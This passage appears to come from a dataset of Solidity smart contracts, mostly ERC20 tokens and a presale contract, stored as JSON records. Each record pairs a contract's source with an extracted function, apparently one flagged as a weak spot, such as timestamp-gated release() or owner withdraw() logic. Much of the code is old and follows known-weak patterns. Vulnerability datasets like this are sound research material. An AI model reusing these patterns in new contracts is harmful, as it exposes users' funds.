    "function distribute (address _token) public returns (bool) {\nuint256 balance = getTokenBalance(_token);\nuint256 perStakeHolder = getPortion(balance);\nif (balance < 1) {\nemit InsufficientTokenBalance(_token, block.timestamp);\nreturn false;\n} else {\nfor (uint256 count = 0; count < stakeHolders.length; count++) {\n_transfer(_token, stakeHolders[count], perStakeHolder);\n}\nuint256 newBalance = getTokenBalance(_token);\nif (newBalance > 0 && getPortion(newBalance) == 0) {\n_transfer(_token, owner, newBalance);\n}\nemit TokensDistributed(_token, balance, block.timestamp);\nreturn true;\n}\n}",
    "function distribute (address _token) public returns (bool) {\nuint256 balance = getTokenBalance(_token);\nuint256 totalWeight = getTotalWeight();\nif (balance < 1) {\nemit InsufficientTokenBalance(_token, block.timestamp);\nreturn false;\n} else {\nfor (uint256 count = 0; count < stakeHolders.length; count++) {\nuint256 perStakeHolder = getPortion(balance, totalWeight, stakeHolders[count]);\n_transfer(_token, stakeHolders[count], perStakeHolder);\n}\nuint256 newBalance = getTokenBalance(_token);\nif (newBalance > 0) {\n_transfer(_token, owner, newBalance);\n}\nemit TokensDistributed(_token, balance, block.timestamp);\nreturn true;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ecf"
  },
  "filename": "10798.sol",
  "content": "pragma solidity 0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint64 public releaseTime;\n constructor(ERC20Basic _token, address _beneficiary, uint64 _releaseTime) public {\n require(_releaseTime > uint64(block.timestamp));\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(uint64(block.timestamp) >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\ncontract Owned {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n}\ncontract ReferralDiscountToken is StandardToken, Owned {\n mapping(address => address) referrerOf;\n address[] ownersIndex;\n event Referral(address indexed referred, address indexed referrer);\n function referralDiscountPercentage(address _owner) public view returns (uint256 percent) {\n uint256 total = 0;\n if(referrerOf[_owner] != address(0)) {\n total = total.add(10);\n }\n for(uint256 i = 0; i < ownersIndex.length; i++) {\n if(referrerOf[ownersIndex[i]] == _owner) {\n total = total.add(10);\n }\n }\n return total;\n }\n function setReferrer(address _referred, address _referrer) onlyOwner public returns (bool success) {\n require(_referrer != address(0));\n require(_referrer != address(_referred));\n require(referrerOf[_referred] == address(0));\n ownersIndex.push(_referred);\n referrerOf[_referred] = _referrer;\n emit Referral(_referred, _referrer);\n return true;\n }\n}\ncontract NaorisToken is ReferralDiscountToken {\n string public constant name = \"NaorisToken\";\n string public constant symbol = \"NAO\";\n uint256 public constant decimals = 18;\n address public saleTeamAddress;\n address public referalAirdropsTokensAddress;\n address public reserveFundAddress;\n address public thinkTankFundAddress;\n address public lockedBoardBonusAddress;\n address public treasuryTimelockAddress;\n bool public tokenSaleClosed = false;\n uint64 date01May2019 = 1556668800;\n uint256 public constant TOKENS_HARD_CAP = 400000000 * 10 ** decimals;\n uint256 public constant TOKENS_SALE_HARD_CAP = 300000000 * 10 ** decimals;\n uint256 public constant REFERRAL_TOKENS = 10000000 * 10 ** decimals;\n uint256 public constant AIRDROP_TOKENS = 10000000 * 10 ** decimals;\n uint256 public constant THINK_TANK_FUND_TOKENS = 40000000 * 10 ** decimals;\n uint256 public constant NAORIS_TEAM_TOKENS = 20000000 * 10 ** decimals;\n uint256 public constant LOCKED_BOARD_BONUS_TOKENS = 20000000 * 10 ** decimals;\n modifier onlyTeam {\n assert(msg.sender == saleTeamAddress || msg.sender == owner);\n _;\n }\n modifier beforeEnd {\n assert(!tokenSaleClosed);\n _;\n }\n constructor(address _saleTeamAddress, address _referalAirdropsTokensAddress, address _reserveFundAddress,\n address _thinkTankFundAddress, address _lockedBoardBonusAddress) public {\n require(_saleTeamAddress != address(0));\n require(_referalAirdropsTokensAddress != address(0));\n require(_reserveFundAddress != address(0));\n require(_thinkTankFundAddress != address(0));\n require(_lockedBoardBonusAddress != address(0));\n saleTeamAddress = _saleTeamAddress;\n referalAirdropsTokensAddress = _referalAirdropsTokensAddress;\n reserveFundAddress = _reserveFundAddress;\n thinkTankFundAddress = _thinkTankFundAddress;\n lockedBoardBonusAddress = _lockedBoardBonusAddress;\n balances[saleTeamAddress] = TOKENS_SALE_HARD_CAP;\n totalSupply_ = TOKENS_SALE_HARD_CAP;\n emit Transfer(0x0, saleTeamAddress, TOKENS_SALE_HARD_CAP);\n balances[referalAirdropsTokensAddress] = REFERRAL_TOKENS;\n totalSupply_ = totalSupply_.add(REFERRAL_TOKENS);\n emit Transfer(0x0, referalAirdropsTokensAddress, REFERRAL_TOKENS);\n balances[referalAirdropsTokensAddress] = balances[referalAirdropsTokensAddress].add(AIRDROP_TOKENS);\n totalSupply_ = totalSupply_.add(AIRDROP_TOKENS);\n emit Transfer(0x0, referalAirdropsTokensAddress, AIRDROP_TOKENS);\n }\n function close() public onlyTeam beforeEnd {\n uint256 unsoldSaleTokens = balances[saleTeamAddress];\n if(unsoldSaleTokens > 0) {\n balances[saleTeamAddress] = 0;\n totalSupply_ = totalSupply_.sub(unsoldSaleTokens);\n emit Transfer(saleTeamAddress, 0x0, unsoldSaleTokens);\n }\n uint256 unspentReferalAirdropTokens = balances[referalAirdropsTokensAddress];\n if(unspentReferalAirdropTokens > 0) {\n balances[referalAirdropsTokensAddress] = 0;\n balances[reserveFundAddress] = balances[reserveFundAddress].add(unspentReferalAirdropTokens);\n emit Transfer(referalAirdropsTokensAddress, reserveFundAddress, unspentReferalAirdropTokens);\n }\n balances[thinkTankFundAddress] = balances[thinkTankFundAddress].add(THINK_TANK_FUND_TOKENS);\n totalSupply_ = totalSupply_.add(THINK_TANK_FUND_TOKENS);\n emit Transfer(0x0, thinkTankFundAddress, THINK_TANK_FUND_TOKENS);\n balances[owner] = balances[owner].add(NAORIS_TEAM_TOKENS);\n totalSupply_ = totalSupply_.add(NAORIS_TEAM_TOKENS);\n emit Transfer(0x0, owner, NAORIS_TEAM_TOKENS);\n TokenTimelock lockedTreasuryTokens = new TokenTimelock(this, lockedBoardBonusAddress, date01May2019);\n treasuryTimelockAddress = address(lockedTreasuryTokens);\n balances[treasuryTimelockAddress] = balances[treasuryTimelockAddress].add(LOCKED_BOARD_BONUS_TOKENS);\n totalSupply_ = totalSupply_.add(LOCKED_BOARD_BONUS_TOKENS);\n emit Transfer(0x0, treasuryTimelockAddress, LOCKED_BOARD_BONUS_TOKENS);\n require(totalSupply_ <= TOKENS_HARD_CAP);\n tokenSaleClosed = true;\n }\n function tokenDiscountPercentage(address _owner) public view returns (uint256 percent) {\n if(balanceOf(_owner) >= 1000000 * 10**decimals) {\n return 50;\n } else if(balanceOf(_owner) >= 500000 * 10**decimals) {\n return 30;\n } else if(balanceOf(_owner) >= 250000 * 10**decimals) {\n return 25;\n } else if(balanceOf(_owner) >= 100000 * 10**decimals) {\n return 20;\n } else if(balanceOf(_owner) >= 50000 * 10**decimals) {\n return 15;\n } else if(balanceOf(_owner) >= 10000 * 10**decimals) {\n return 10;\n } else if(balanceOf(_owner) >= 1000 * 10**decimals) {\n return 5;\n } else {\n return 0;\n }\n }\n function getTotalDiscount(address _owner) public view returns (uint256 percent) {\n uint256 total = 0;\n total += tokenDiscountPercentage(_owner);\n total += referralDiscountPercentage(_owner);\n return (total > 60) ? 60 : total;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n if(tokenSaleClosed) {\n return super.transferFrom(_from, _to, _value);\n }\n return false;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n if(tokenSaleClosed || msg.sender == referalAirdropsTokensAddress\n || msg.sender == saleTeamAddress) {\n return super.transfer(_to, _value);\n }\n return false;\n }\n}",
  "extract_feature": [
    "function release() public {\nrequire(uint64(block.timestamp) >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed0"
  },
  "filename": "10803.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Ownable {\n address public owner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract Haltable is Ownable {\n bool public halted = false;\n modifier inNormalState {\n require(!halted);\n _;\n }\n modifier inEmergencyState {\n require(halted);\n _;\n }\n function halt() external onlyOwner inNormalState {\n halted = true;\n }\n function unhalt() external onlyOwner inEmergencyState {\n halted = false;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) constant returns (uint256);\n function transfer(address to, uint256 value) returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) returns (bool) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) returns (bool);\n function approve(address spender, uint256 value) returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) allowed;\n function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\n var _allowance = allowed[_from][msg.sender];\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract Burnable is StandardToken {\n using SafeMath for uint;\n event Burn(address indexed from, uint value);\n function burn(uint _value) returns (bool success) {\n require(_value > 0 && balances[msg.sender] >= _value);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint _value) returns (bool success) {\n require(_from != 0x0 && _value > 0 && balances[_from] >= _value);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n totalSupply = totalSupply.sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Burn(_from, _value);\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract ERC223ReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data);\n}\ncontract AnythingAppToken is Burnable, Ownable {\n string public constant name = \"AnyCoin\";\n string public constant symbol = \"ANY\";\n uint8 public constant decimals = 18;\n uint public constant INITIAL_SUPPLY = 400000000 * 1 ether;\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n require(released || transferAgents[_sender]);\n _;\n }\n modifier inReleaseState(bool releaseState) {\n require(releaseState == released);\n _;\n }\n modifier onlyReleaseAgent() {\n require(msg.sender == releaseAgent);\n _;\n }\n function AnythingAppToken() {\n totalSupply = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n releaseAgent = addr;\n }\n function release() onlyReleaseAgent inReleaseState(false) public {\n released = true;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n transferAgents[addr] = state;\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint _value, bytes _data) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n bytes memory empty;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, empty);\n }\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function burn(uint _value) onlyOwner returns (bool success) {\n return super.burn(_value);\n }\n function burnFrom(address _from, uint _value) onlyOwner returns (bool success) {\n return super.burnFrom(_from, _value);\n }\n}\ncontract InvestorWhiteList is Ownable {\n mapping (address => bool) public investorWhiteList;\n mapping (address => address) public referralList;\n function InvestorWhiteList() {\n }\n function addInvestorToWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && !investorWhiteList[investor]);\n investorWhiteList[investor] = true;\n }\n function removeInvestorFromWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && investorWhiteList[investor]);\n investorWhiteList[investor] = false;\n }\n function addReferralOf(address investor, address referral) external onlyOwner {\n require(investor != 0x0 && referral != 0x0 && referralList[investor] == 0x0 && investor != referral);\n referralList[investor] = referral;\n }\n function isAllowed(address investor) constant external returns (bool result) {\n return investorWhiteList[investor];\n }\n function getReferralOf(address investor) constant external returns (address result) {\n return referralList[investor];\n }\n}\ncontract PriceReceiver {\n address public ethPriceProvider;\n modifier onlyEthPriceProvider() {\n require(msg.sender == ethPriceProvider);\n _;\n }\n function receiveEthPrice(uint ethUsdPrice) external;\n function setEthPriceProvider(address provider) external;\n}\ncontract AnythingAppTokenPreSale is Haltable, PriceReceiver {\n using SafeMath for uint;\n string public constant name = \"AnythingAppTokenPreSale\";\n AnythingAppToken public token;\n InvestorWhiteList public investorWhiteList;\n address public beneficiary;\n uint public tokenPriceUsd;\n uint public totalTokens;\n uint public ethUsdRate;\n uint public collected = 0;\n uint public withdrawn = 0;\n uint public tokensSold = 0;\n uint public investorCount = 0;\n uint public weiRefunded = 0;\n uint public startTime;\n uint public endTime;\n bool public crowdsaleFinished = false;\n mapping (address => bool) public refunded;\n mapping (address => uint) public deposited;\n uint public constant BONUS_LEVEL_1 = 40;\n uint public constant BONUS_LEVEL_2 = 35;\n uint public constant BONUS_LEVEL_3 = 30;\n uint public firstStage;\n uint public secondStage;\n uint public thirdStage;\n uint public constant MINIMAL_PURCHASE = 250 ether;\n uint public constant LIMIT_PER_USER = 500000 ether;\n event NewContribution(address indexed holder, uint tokenAmount, uint etherAmount);\n event NewReferralTransfer(address indexed investor, address indexed referral, uint tokenAmount);\n event Refunded(address indexed holder, uint amount);\n event Deposited(address indexed holder, uint amount);\n modifier preSaleActive() {\n require(block.timestamp >= startTime && block.timestamp < endTime);\n _;\n }\n modifier preSaleEnded() {\n require(block.timestamp >= endTime);\n _;\n }\n modifier inWhiteList() {\n require(investorWhiteList.isAllowed(msg.sender));\n _;\n }\n function AnythingAppTokenPreSale(\n address _token,\n address _beneficiary,\n address _investorWhiteList,\n uint _totalTokens,\n uint _tokenPriceUsd,\n uint _baseEthUsdPrice,\n uint _firstStage,\n uint _secondStage,\n uint _thirdStage,\n uint _startTime,\n uint _endTime\n ) {\n ethUsdRate = _baseEthUsdPrice;\n tokenPriceUsd = _tokenPriceUsd;\n totalTokens = _totalTokens.mul(1 ether);\n token = AnythingAppToken(_token);\n investorWhiteList = InvestorWhiteList(_investorWhiteList);\n beneficiary = _beneficiary;\n firstStage = _firstStage.mul(1 ether);\n secondStage = _secondStage.mul(1 ether);\n thirdStage = _thirdStage.mul(1 ether);\n startTime = _startTime;\n endTime = _endTime;\n }\n function() payable inWhiteList {\n doPurchase(msg.sender);\n }\n function tokenFallback(address _from, uint _value, bytes _data) public pure { }\n function doPurchase(address _owner) private preSaleActive inNormalState {\n if (token.balanceOf(msg.sender) == 0) investorCount++;\n uint tokens = msg.value.mul(ethUsdRate).div(tokenPriceUsd);\n address referral = investorWhiteList.getReferralOf(msg.sender);\n uint referralBonus = calculateReferralBonus(tokens);\n uint bonus = calculateBonus(tokens, referral);\n tokens = tokens.add(bonus);\n uint newTokensSold = tokensSold.add(tokens);\n if (referralBonus > 0 && referral != 0x0) {\n newTokensSold = newTokensSold.add(referralBonus);\n }\n require(newTokensSold <= totalTokens);\n require(token.balanceOf(msg.sender).add(tokens) <= LIMIT_PER_USER);\n tokensSold = newTokensSold;\n collected = collected.add(msg.value);\n deposited[msg.sender] = deposited[msg.sender].add(msg.value);\n token.transfer(msg.sender, tokens);\n NewContribution(_owner, tokens, msg.value);\n if (referralBonus > 0 && referral != 0x0) {\n token.transfer(referral, referralBonus);\n NewReferralTransfer(msg.sender, referral, referralBonus);\n }\n }\n function calculateBonus(uint _tokens, address _referral) private returns (uint _bonuses) {\n uint bonus;\n if (tokensSold < firstStage) {\n bonus = BONUS_LEVEL_1;\n } else if (tokensSold >= firstStage && tokensSold < secondStage) {\n bonus = BONUS_LEVEL_2;\n } else {\n bonus = BONUS_LEVEL_3;\n }\n if (_referral != 0x0) {\n bonus += 5;\n }\n return _tokens.mul(bonus).div(100);\n }\n function calculateReferralBonus(uint _tokens) internal constant returns (uint _bonus) {\n return _tokens.mul(20).div(100);\n }\n function withdraw() external onlyOwner {\n uint withdrawLimit = 500 ether;\n if (withdrawn < withdrawLimit) {\n uint toWithdraw = collected.sub(withdrawn);\n if (toWithdraw + withdrawn > withdrawLimit) {\n toWithdraw = withdrawLimit.sub(withdrawn);\n }\n beneficiary.transfer(toWithdraw);\n withdrawn = withdrawn.add(toWithdraw);\n return;\n }\n require(block.timestamp >= endTime);\n beneficiary.transfer(collected);\n token.transfer(beneficiary, token.balanceOf(this));\n crowdsaleFinished = true;\n }\n function refund() external preSaleEnded inNormalState {\n require(refunded[msg.sender] == false);\n uint refund = deposited[msg.sender];\n require(refund > 0);\n deposited[msg.sender] = 0;\n refunded[msg.sender] = true;\n weiRefunded = weiRefunded.add(refund);\n msg.sender.transfer(refund);\n Refunded(msg.sender, refund);\n }\n function receiveEthPrice(uint ethUsdPrice) external onlyEthPriceProvider {\n require(ethUsdPrice > 0);\n ethUsdRate = ethUsdPrice;\n }\n function setEthPriceProvider(address provider) external onlyOwner {\n require(provider != 0x0);\n ethPriceProvider = provider;\n }\n function setNewWhiteList(address newWhiteList) external onlyOwner {\n require(newWhiteList != 0x0);\n investorWhiteList = InvestorWhiteList(newWhiteList);\n }\n}",
  "extract_feature": [
    "function withdraw() external onlyOwner {\nuint withdrawLimit = 500 ether;\nif (withdrawn < withdrawLimit) {\nuint toWithdraw = collected.sub(withdrawn);\nif (toWithdraw + withdrawn > withdrawLimit) {\ntoWithdraw = withdrawLimit.sub(withdrawn);\n}\nbeneficiary.transfer(toWithdraw);\nwithdrawn = withdrawn.add(toWithdraw);\nreturn;\n}\nrequire(block.timestamp >= endTime);\nbeneficiary.transfer(collected);\ntoken.transfer(beneficiary, token.balanceOf(this));\ncrowdsaleFinished = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed1"
  },
  "filename": "10806.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Ownable {\n address public owner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract Haltable is Ownable {\n bool public halted = false;\n modifier inNormalState {\n require(!halted);\n _;\n }\n modifier inEmergencyState {\n require(halted);\n _;\n }\n function halt() external onlyOwner inNormalState {\n halted = true;\n }\n function unhalt() external onlyOwner inEmergencyState {\n halted = false;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) constant returns (uint256);\n function transfer(address to, uint256 value) returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) returns (bool) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) returns (bool);\n function approve(address spender, uint256 value) returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) allowed;\n function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\n var _allowance = allowed[_from][msg.sender];\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract Burnable is StandardToken {\n using SafeMath for uint;\n event Burn(address indexed from, uint value);\n function burn(uint _value) returns (bool success) {\n require(_value > 0 && balances[msg.sender] >= _value);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint _value) returns (bool success) {\n require(_from != 0x0 && _value > 0 && balances[_from] >= _value);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n totalSupply = totalSupply.sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Burn(_from, _value);\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract ERC223ReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data);\n}\ncontract AnythingAppToken is Burnable, Ownable {\n string public constant name = \"AnyCoin\";\n string public constant symbol = \"ANY\";\n uint8 public constant decimals = 18;\n uint public constant INITIAL_SUPPLY = 400000000 * 1 ether;\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n require(released || transferAgents[_sender]);\n _;\n }\n modifier inReleaseState(bool releaseState) {\n require(releaseState == released);\n _;\n }\n modifier onlyReleaseAgent() {\n require(msg.sender == releaseAgent);\n _;\n }\n function AnythingAppToken() {\n totalSupply = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n releaseAgent = addr;\n }\n function release() onlyReleaseAgent inReleaseState(false) public {\n released = true;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n transferAgents[addr] = state;\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint _value, bytes _data) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n bytes memory empty;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, empty);\n }\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function burn(uint _value) onlyOwner returns (bool success) {\n return super.burn(_value);\n }\n function burnFrom(address _from, uint _value) onlyOwner returns (bool success) {\n return super.burnFrom(_from, _value);\n }\n}\ncontract InvestorWhiteList is Ownable {\n mapping (address => bool) public investorWhiteList;\n mapping (address => address) public referralList;\n function InvestorWhiteList() {\n }\n function addInvestorToWhiteList(address 